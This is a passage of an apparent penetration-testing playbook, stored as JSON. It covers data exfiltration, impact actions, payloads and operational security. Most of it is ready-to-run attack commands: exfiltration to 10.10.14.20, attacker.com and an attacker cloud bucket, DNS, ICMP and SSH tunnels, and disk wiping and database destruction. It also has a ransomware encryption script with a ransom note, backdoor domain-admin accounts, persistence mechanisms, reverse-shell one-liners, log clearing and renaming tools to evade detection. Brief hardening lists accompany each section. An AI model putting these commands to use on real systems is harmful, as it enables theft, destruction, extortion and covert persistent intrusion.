              "text": "# Base64 encoding\n$fileContent = [System.IO.File]::ReadAllBytes(\"C:\\sensitive\\document.pdf\")\n$encoded = [Convert]::ToBase64String($fileContent)\n$encoded | Out-File -FilePath \"C:\\temp\\encoded.txt\"\n\n# Split large files\nSplit-File -InputFile data.zip -PartSizeBytes 1MB\n\n# XOR encoding\n$key = 0x54\n$bytes = [System.IO.File]::ReadAllBytes(\"file.txt\")\nfor($i=0; $i -lt $bytes.Length; $i++) {\n    $bytes[$i] = $bytes[$i] -bxor $key\n}\n[System.IO.File]::WriteAllBytes(\"file.enc\", $bytes)"
            },
            {
              "type": "p",
              "parts": [
                "**Steganography:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Hide data in images\nsteghide embed -cf image.jpg -ef secret.txt -p \"password\"\n\n# Using outguess\noutguess -k \"mykey\" -d secret.txt image.jpg output.jpg"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Reduced file sizes and obfuscated content for stealthy exfiltration."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Data loss prevention (",
                    "**DLP**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "File transfer monitoring"
                  ]
                },
                {
                  "parts": [
                    "Compression tool detection"
                  ]
                },
                {
                  "parts": [
                    "Entropy analysis for encoded data"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " file activity monitoring"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**7zip**",
                ", ",
                "**tar**",
                ", ",
                "**PowerShell**",
                ", ",
                "**steghide**",
                ", ",
                "**outguess**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use common compression formats. Avoid unusual file sizes. Test against ",
                "**DLP**",
                " solutions."
              ]
            },
            {
              "type": "h3",
              "text": "10.2 Using Common Ports"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Exfiltrating data over commonly allowed ports (",
                "**HTTP/S**",
                ", ",
                "**DNS**",
                ", ",
                "**SMTP**",
                ") to bypass egress filtering."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**HTTP/S exfiltration:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Using curl\ncurl -X POST -F \"file=@data.zip\" http://10.10.14.20/upload\n\n# PowerShell HTTP upload\nInvoke-WebRequest -Uri \"http://10.10.14.20/upload\" -Method POST -InFile \"data.zip\"\n\n# Using certutil for chunks\ncertutil -encode data.zip encoded.txt\n# Then transfer encoded.txt in chunks via HTTP"
            },
            {
              "type": "p",
              "parts": [
                "**DNS exfiltration:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Data in DNS queries\n# Encode data as subdomains\nencoded_data=$(echo \"secret\" | base64)\ndig @10.10.14.20 $encoded_data.attacker.com\n\n# PowerShell DNS exfiltration\n$data = [System.IO.File]::ReadAllBytes(\"file.txt\")\n$b64 = [Convert]::ToBase64String($data)\n$chunks = $b64 -split '(.{63})' -ne ''\nforeach($chunk in $chunks) {\n    Resolve-DnsName \"$chunk.attacker.com\" -Server 10.10.14.20\n}"
            },
            {
              "type": "p",
              "parts": [
                "**ICMP exfiltration:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Data in ICMP payloads\n# Server: sudo tcpdump -i eth0 icmp -A\n# Client: ping -c 1 -p $(echo \"secret\" | xxd -p) 10.10.14.20"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Data transfer over allowed protocols, potentially slower but more stealthy."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Protocol anomaly detection"
                  ]
                },
                {
                  "parts": [
                    "DNS query monitoring"
                  ]
                },
                {
                  "parts": [
                    "HTTP payload inspection"
                  ]
                },
                {
                  "parts": [
                    "Egress filtering"
                  ]
                },
                {
                  "parts": [
                    "Data transfer baselining"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**curl**",
                ", ",
                "**PowerShell**",
                ", ",
                "**dig**",
                ", ",
                "**tcpdump**",
                ", custom scripts"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Match normal traffic patterns. Use rate limiting. Consider data sensitivity."
              ]
            },
            {
              "type": "h3",
              "text": "10.3 Cloud Exfiltration"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Using cloud services for data exfiltration to blend with legitimate traffic and leverage trusted domains."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**AWS S3 exfiltration:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# AWS CLI upload\naws s3 cp sensitive.txt s3://attacker-bucket/\n\n# With encryption\naws s3 cp sensitive.txt s3://attacker-bucket/ --sse AES256\n\n# PowerShell with AWS Tools\nWrite-S3Object -BucketName attacker-bucket -File sensitive.txt"
            },
            {
              "type": "p",
              "parts": [
                "**Azure Blob Storage:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Azure CLI upload\naz storage blob upload --account-name attacker --container exfil --name data.txt --file sensitive.txt\n\n# With SAS token\naz storage blob upload --account-name attacker --container exfil --name data.txt --file sensitive.txt --sas-token \"sv=2020-08-04&ss=b&srt=sco&sp=rwdlacx&se=2024-01-01T00:00:00Z&st=2023-01-01T00:00:00Z&spr=https&sig=...\""
            },
            {
              "type": "p",
              "parts": [
                "**Google Drive:**"
              ]
            },
            {
              "type": "code",
              "language": "python",
              "text": "# Python with Google Drive API\nfrom googleapiclient.discovery import build\nfrom googleapiclient.http import MediaFileUpload\n\nservice = build('drive', 'v3', credentials=creds)\nfile_metadata = {'name': 'data.txt'}\nmedia = MediaFileUpload('sensitive.txt', mimetype='text/plain')\nservice.files().create(body=file_metadata, media_body=media, fields='id').execute()"
            },
            {
              "type": "p",
              "parts": [
                "**Dropbox exfiltration:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Dropbox upload\ncurl -X POST https://content.dropboxapi.com/2/files/upload \\\n    --header \"Authorization: Bearer <ACCESS_TOKEN>\" \\\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/data.txt\\\"}\" \\\n    --data-binary @sensitive.txt"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Data transfer to cloud storage, potentially bypassing network controls through trusted domains."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Cloud access monitoring"
                  ]
                },
                {
                  "parts": [
                    "**DLP**",
                    " for cloud services"
                  ]
                },
                {
                  "parts": [
                    "API key monitoring"
                  ]
                },
                {
                  "parts": [
                    "Unusual upload patterns"
                  ]
                },
                {
                  "parts": [
                    "Cloud security posture management"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**AWS CLI**",
                ", ",
                "**Azure CLI**",
                ", ",
                "**Google APIs**",
                ", ",
                "**Dropbox API**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use legitimate-looking bucket names. Monitor for rate limiting. Clean up after exfiltration."
              ]
            },
            {
              "type": "h3",
              "text": "10.4 DNS/ICMP Tunnels"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Using protocol tunnels for data exfiltration that bypass traditional firewall rules and monitoring."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**DNS tunneling:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# dnscat2 setup\n# Server\nsudo ruby dnscat2.rb --dns domain=attacker.com,host=0.0.0.0\n\n# Client\ndnscat2.exe --dns server=10.10.14.20,port=53 --secret=mysecret\n\n# Data exfiltration through DNS\ncat file.txt | while read line; do dig @10.10.14.20 \"$line.attacker.com\"; done"
            },
            {
              "type": "p",
              "parts": [
                "**ICMP tunneling:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# ptunnel setup\n# Server\nptunnel -x password\n\n# Client\nptunnel -p 10.10.14.20 -lp 1080 -da target.com -dp 22 -x password\n\n# Then use SOCKS proxy for data transfer"
            },
            {
              "type": "p",
              "parts": [
                "**HTTP tunneling:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Using httptunnel\n# Server\nhts --forward-port localhost:22 80\n\n# Client\nhtc --forward-port 8080 example.com:80\nssh -p 8080 user@localhost"
            },
            {
              "type": "p",
              "parts": [
                "**SSH tunneling for exfiltration:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# SSH port forwarding\nssh -R 8080:localhost:80 user@10.10.14.20\n# Then exfiltrate through the tunnel\n\n# Dynamic port forwarding (SOCKS)\nssh -D 1080 user@10.10.14.20"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Stealthy data transfer through protocol tunnels, often slower but harder to detect."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "DNS query analysis"
                  ]
                },
                {
                  "parts": [
                    "ICMP payload inspection"
                  ]
                },
                {
                  "parts": [
                    "Protocol anomaly detection"
                  ]
                },
                {
                  "parts": [
                    "Tunnel traffic monitoring"
                  ]
                },
                {
                  "parts": [
                    "Egress filtering"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**dnscat2**",
                ", ",
                "**ptunnel**",
                ", ",
                "**httptunnel**",
                ", ",
                "**SSH**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use encryption within tunnels. Monitor performance impact. Have backup methods."
              ]
            },
            {
              "type": "h2",
              "text": "11. 💣 Impact / Actions on Objectives"
            },
            {
              "type": "h3",
              "text": "11.1 Data Destruction"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Deleting or corrupting data to disrupt operations, often used in ransomware or wiper attacks."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**File deletion scripts:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Linux recursive deletion\nrm -rf /home/user/documents/*\nfind /home/user -type f -exec rm {} \\;\n\n# Windows recursive deletion\ndel /s /q /f C:\\data\\*\nrmdir /s /q C:\\data"
            },
            {
              "type": "p",
              "parts": [
                "**Disk wiping:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Linux disk wiping\ndd if=/dev/zero of=/dev/sda bs=1M\nshred -v -n 5 /dev/sda\n\n# Windows cipher wipe\ncipher /w:C:\\"
            },
            {
              "type": "p",
              "parts": [
                "**Database destruction:**"
              ]
            },
            {
              "type": "code",
              "language": "sql",
              "text": "-- SQL database destruction\nDROP DATABASE production;\nDELETE FROM important_table;\nTRUNCATE TABLE critical_data;"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Data loss, system disruption, and potential business impact."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "File integrity monitoring"
                  ]
                },
                {
                  "parts": [
                    "Backup systems"
                  ]
                },
                {
                  "parts": [
                    "Access controls"
                  ]
                },
                {
                  "parts": [
                    "Change management"
                  ]
                },
                {
                  "parts": [
                    "Disaster recovery plans"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**rm**",
                ", ",
                "**del**",
                ", ",
                "**dd**",
                ", ",
                "**shred**",
                ", ",
                "**cipher**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Only in authorized scenarios. Document impact for reporting. Consider legal implications."
              ]
            },
            {
              "type": "h3",
              "text": "11.2 Ransomware Deployment"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Encrypting files and demanding payment for decryption, simulating real ransomware attacks."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Simple encryption script:**"
              ]
            },
            {
              "type": "code",
              "language": "python",
              "text": "import os\nfrom cryptography.fernet import Fernet\n\n# Generate key\nkey = Fernet.generate_key()\ncipher_suite = Fernet(key)\n\n# Encrypt files\nfor root, dirs, files in os.walk(\"C:\\\\target\"):\n    for file in files:\n        file_path = os.path.join(root, file)\n        with open(file_path, 'rb') as f:\n            encrypted_data = cipher_suite.encrypt(f.read())\n        with open(file_path + '.encrypted', 'wb') as f:\n            f.write(encrypted_data)\n        os.remove(file_path)"
            },
            {
              "type": "p",
              "parts": [
                "**Ransom note creation:**"
              ]
            },
            {
              "type": "code",
              "language": "python",
              "text": "# Create ransom note\nnote = \"\"\"\nYour files have been encrypted!\n\nTo decrypt, send 0.1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nContact: decrypt@protonmail.com\n\"\"\"\n\nwith open(\"README_DECRYPT.txt\", \"w\") as f:\n    f.write(note)"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Encrypted files, ransom notes, and simulated extortion scenario."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "File encryption monitoring"
                  ]
                },
                {
                  "parts": [
                    "Backup systems"
                  ]
                },
                {
                  "parts": [
                    "Application whitelisting"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " ransomware protection"
                  ]
                },
                {
                  "parts": [
                    "User training"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "Custom scripts, cryptography libraries, simulated ransomware"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use only in controlled environments. Have decryption capability. Clear documentation."
              ]
            },
            {
              "type": "h3",
              "text": "11.3 Account Manipulation"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Modifying user accounts for persistence, privilege escalation, or access maintenance."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**User account creation:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Local user creation\nnet user backdoor Password123! /add\nnet localgroup administrators backdoor /add\n\n# Domain user creation\nnet user /domain backdoor Password123! /add\nnet group \"Domain Admins\" backdoor /add /domain"
            },
            {
              "type": "p",
              "parts": [
                "**Password changes:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Change user password\nnet user administrator NewPassword123!\n\n# Domain password change\nnet user /domain administrator NewPassword123!"
            },
            {
              "type": "p",
              "parts": [
                "**Group membership modification:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerShell AD modifications\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"backdoor_user\"\n\n# Local group modifications\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"backdoor_user\""
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Modified account permissions, new backdoor accounts, and changed authentication."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Account monitoring"
                  ]
                },
                {
                  "parts": [
                    "Privileged access management"
                  ]
                },
                {
                  "parts": [
                    "Regular user reviews"
                  ]
                },
                {
                  "parts": [
                    "Change auditing"
                  ]
                },
                {
                  "parts": [
                    "**MFA**",
                    " implementation"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**net.exe**",
                ", ",
                "**PowerShell**",
                ", AD modules"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Document all changes. Use realistic account names. Clean up after engagement."
              ]
            },
            {
              "type": "h3",
              "text": "11.4 Data Extraction"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Collecting and preparing sensitive data for exfiltration to demonstrate data breach impact."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Sensitive file discovery:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Find sensitive files\nGet-ChildItem C:\\ -Include *.pdf,*.doc,*.docx,*.xls,*.xlsx -Recurse -ErrorAction SilentlyContinue\n\n# Search for specific content\nSelect-String -Path \"*.txt\" -Pattern \"password|confidential|secret\"\n\n# Database extraction\nInvoke-SQLCmd -Query \"SELECT * FROM Users\" -ServerInstance \"DBSERVER\""
            },
            {
              "type": "p",
              "parts": [
                "**Data classification:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Identify PII/PCI data\n$patterns = @{\n    \"SSN\" = \"\\d{3}-\\d{2}-\\d{4}\"\n    \"CreditCard\" = \"\\d{4}-\\d{4}-\\d{4}-\\d{4}\"\n    \"Email\" = \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b\"\n}\n\nGet-ChildItem C:\\data -Recurse | ForEach-Object {\n    $content = Get-Content $_.FullName\n    foreach ($pattern in $patterns.GetEnumerator()) {\n        if ($content -match $pattern.Value) {\n            Write-Host \"Found $($pattern.Key) in $($_.FullName)\"\n        }\n    }\n}"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Identified sensitive data, prepared for exfiltration analysis and reporting."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Data classification systems"
                  ]
                },
                {
                  "parts": [
                    "Access monitoring"
                  ]
                },
                {
                  "parts": [
                    "**DLP**",
                    " solutions"
                  ]
                },
                {
                  "parts": [
                    "File activity auditing"
                  ]
                },
                {
                  "parts": [
                    "Encryption at rest"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell**",
                ", ",
                "**grep**",
                ", custom scripts, ",
                "**DLP**",
                " tools"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Only access authorized data. Document findings. Secure extracted data."
              ]
            },
            {
              "type": "h3",
              "text": "11.5 Defacement / Persistence"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Demonstrating system compromise through visible changes while maintaining access for continued testing."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Web defacement:**"
              ]
            },
            {
              "type": "code",
              "language": "html",
              "text": "<!-- Simple defacement page -->\n<html>\n<head><title>System Compromised</title></head>\n<body>\n<h1>Security Test Successful</h1>\n<p>This system has been compromised during authorized penetration testing.</p>\n<p>Test ID: PT-2024-001</p>\n<p>Contact: security@company.com</p>\n</body>\n</html>"
            },
            {
              "type": "p",
              "parts": [
                "**Persistence mechanisms:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Multiple persistence methods\n# Scheduled task\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-File C:\\beacon.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName \"SystemUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest\n\n# Service creation\nNew-Service -Name \"WindowsMonitor\" -BinaryPathName \"C:\\beacon.exe\" -StartupType Automatic\n\n# Registry run key\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Update\" -Value \"C:\\beacon.exe\""
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Visible compromise indicators and maintained access for continued testing."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "File integrity monitoring"
                  ]
                },
                {
                  "parts": [
                    "Web application firewalls"
                  ]
                },
                {
                  "parts": [
                    "Change detection"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " persistence detection"
                  ]
                },
                {
                  "parts": [
                    "Regular system reviews"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "Custom HTML, ",
                "**PowerShell**",
                ", system utilities"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Clear communication of test nature. Professional defacement content. Document persistence methods."
              ]
            },
            {
              "type": "h2",
              "text": "12. 🔧 Technical Sections"
            },
            {
              "type": "h3",
              "text": "12.1 Tools"
            },
            {
              "type": "h4",
              "text": "Essential tool categories and examples:"
            },
            {
              "type": "p",
              "parts": [
                "**Reconnaissance:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Subdomain enumeration\nsubfinder -d target.com\namass enum -d target.com\n\n# Port scanning\nnmap -sS -sV -sC target.com\nmasscan -p1-65535 10.10.10.0/24 --rate=1000"
            },
            {
              "type": "p",
              "parts": [
                "**Vulnerability Assessment:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Web vulnerability scanning\nnikto -h target.com\nnuclei -u target.com -t vulnerabilities/\n\n# Network vulnerability scanning\nnessus\nopenvas"
            },
            {
              "type": "p",
              "parts": [
                "**Exploitation:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Metasploit framework\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Standalone exploits\nsearchsploit apache 2.4.49"
            },
            {
              "type": "p",
              "parts": [
                "**Post-Exploitation:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Privilege escalation\nwinpeas.exe\nlinpeas.sh\n\n# Lateral movement\ncrackmapexec smb 10.10.10.0/24 -u user -p pass"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "A comprehensive toolset for all engagement phases, regularly updated and tested."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Application control"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " tool detection"
                  ]
                },
                {
                  "parts": [
                    "Network monitoring"
                  ]
                },
                {
                  "parts": [
                    "Regular patching"
                  ]
                },
                {
                  "parts": [
                    "Security tool deployment"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Kali Linux**",
                ", ",
                "**Parrot OS**",
                ", custom toolkits, commercial tools"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use custom compiled tools. Rename executables. Understand tool signatures."
              ]
            },
            {
              "type": "h3",
              "text": "12.2 Payloads & One-Liners"
            },
            {
              "type": "h4",
              "text": "Comprehensive payload reference:"
            },
            {
              "type": "p",
              "parts": [
                "**Reverse Shell Payloads:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Bash\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1\n\n# Python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n# Perl\nperl -e 'use Socket;$i=\"10.10.14.20\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n# Ruby\nruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.20\",\"443\");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec(\"/bin/sh -i\")'"
            },
            {
              "type": "p",
              "parts": [
                "**File Transfer Methods:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Linux to Windows\nscp file.txt user@windows:/C:/temp/\n\n# Windows to Linux\ncopy file.txt \\\\linux\\share\\\ncertutil -urlcache -split -f http://10.10.14.20/file.txt file.txt"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Quick reference for common payloads and transfer methods during engagements."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Payload detection"
                  ]
                },
                {
                  "parts": [
                    "Network monitoring"
                  ]
                },
                {
                  "parts": [
                    "Application control"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " behavioral analysis"
                  ]
                },
                {
                  "parts": [
                    "User training"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**RevShells.com**",
                ", ",
                "**PayloadsAllTheThings**",
                ", ",
                "**MSFVenom**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Encode/obfuscate payloads. Use staging. Test against target controls."
              ]
            },
            {
              "type": "h3",
              "text": "12.3 OPSEC Notes"
            },
            {
              "type": "h4",
              "text": "Operational security considerations:"
            },
            {
              "type": "p",
              "parts": [
                "**Communication Security:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Encrypted C2 channels\n# Use HTTPS, DNS over TLS, encrypted tunnels\n# Domain fronting when possible"
            },
            {
              "type": "p",
              "parts": [
                "**Tool Obfuscation:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Rename tools\ncp nmap system_update\ncp mimikatz windows_checkup.exe\n\n# Compile from source\ngcc -o legitimate_tool exploit.c"
            },
            {
              "type": "p",
              "parts": [
                "**Log Management:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Clear logs\nwevtutil cl security\nwevtutil cl system\n\n# PowerShell history\nRemove-Item (Get-PSReadlineOption).HistorySavePath"
            },
            {
              "type": "p",
              "parts": [
                "**Network OPSEC:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Use common ports\n# Mimic legitimate traffic\n# Implement jitter and sleep times\n# Use redirectors"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Reduced detection risk and extended operational capability through proper ",
                "**OPSEC**",
                "."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Comprehensive logging"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " integration"
                  ]
                },
                {
                  "parts": [
                    "Network monitoring"
                  ]
                },
                {
                  "parts": [
                    "Behavioral analysis"
                  ]
                },
                {
                  "parts": [
                    "Threat hunting"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**OPSEC**",
                " frameworks, tradecraft guides, operational security manuals"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Assume all actions are monitored. Plan for detection. Have exit strategies."
              ]
            },
            {
              "type": "h3",
              "text": "12.4 MITRE ATT&CK Mapping"
            },
            {
              "type": "h4",
              "text": "Framework alignment for reporting:"
            },
            {
              "type": "p",
              "parts": [
                "**Technique Mapping:**"
              ]
            },
            {
              "type": "code",
              "language": "yaml",
              "text": "Initial Access:\n  - T1566: Phishing\n  - T1078: Valid Accounts\n  - T1189: Drive-by Compromise\n\nExecution:\n  - T1059: Command and Scripting Interpreter\n  - T1047: WMI\n  - T1569: System Services\n\nPersistence:\n  - T1547: Boot or Logon Autostart Execution\n  - T1053: Scheduled Task/Job\n  - T1543: Create or Modify System Process"
            },
            {
              "type": "p",
              "parts": [
                "**Procedure Examples:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# T1059.003: Windows Command Shell\ncmd.exe /c whoami\n\n# T1059.001: PowerShell\npowershell -c \"Get-Process\"\n\n# T1047: WMI\nwmic process call create \"calc.exe\""
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Standardized attack documentation and reporting aligned with industry frameworks."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**ATT&CK**",
